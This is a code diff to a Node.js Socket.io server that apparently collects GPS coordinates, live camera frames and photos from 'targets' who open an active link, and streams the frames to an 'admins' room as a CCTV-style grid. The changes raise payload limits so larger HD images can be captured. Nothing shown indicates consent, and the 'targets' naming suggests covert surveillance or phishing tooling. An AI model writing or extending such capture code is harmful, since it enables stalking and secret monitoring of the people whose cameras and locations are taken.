@@ -12,7 +12,7 @@ const server = http.createServer(app);
 app.set("trust proxy", 1);
 
 const io = new Server(server, {
-    maxHttpBufferSize: 5 * 1024 * 1024,
+    maxHttpBufferSize: 10 * 1024 * 1024, // Increased buffer size for HD images
     pingTimeout: 20000,
     pingInterval: 25000
 });
@@ -32,7 +32,7 @@ const HISTORY_FILE = path.join(DATA_DIR, "access-history.json");
 if (!fs.existsSync(PUBLIC_DIR)) fs.mkdirSync(PUBLIC_DIR, { recursive: true });
 if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
 
-app.use(express.json({ limit: "1mb" }));
+app.use(express.json({ limit: "5mb" }));
 
 const sessionMiddleware = session({
     secret: SESSION_SECRET,
@@ -293,22 +293,25 @@ io.on("connection", (socket) => {
         emitUsersList();
     });
 
+    // Real-time GPS location save handler
     socket.on("user-location", (locData) => {
         const target = connectedTargets.get(socket.id);
         if (!target || !locData || typeof locData.latitude !== "number" || typeof locData.longitude !== "number") return;
-        target.location = { latitude: Number(locData.latitude.toFixed(6)), longitude: Number(locData.longitude.toFixed(6)) };
+        target.location = { 
+            latitude: Number(locData.latitude.toFixed(6)), 
+            longitude: Number(locData.longitude.toFixed(6)) 
+        };
         emitUsersList();
     });
 
     socket.on("live-stream-frame", (frameData) => {
         if (!isLinkActive || !connectedTargets.has(socket.id) || !isValidImageData(frameData)) return;
-        // Broadcast to all connected admins for CCTV multi-view grid
         io.to("admins").emit("update-live-stream", { socketId: socket.id, frameData });
     });
 
     socket.on("user-photo-captured", (imageData) => {
         if (!isLinkActive || !connectedTargets.has(socket.id) || !isValidImageData(imageData)) return;
-        if (imageData.length > 3 * 1024 * 1024 || tempPhotos.size >= MAX_TEMP_PHOTOS) return;
+        if (imageData.length > 8 * 1024 * 1024 || tempPhotos.size >= MAX_TEMP_PHOTOS) return;
         const extension = getImageExtension(imageData);
         if (!extension) return;
         const photo = {
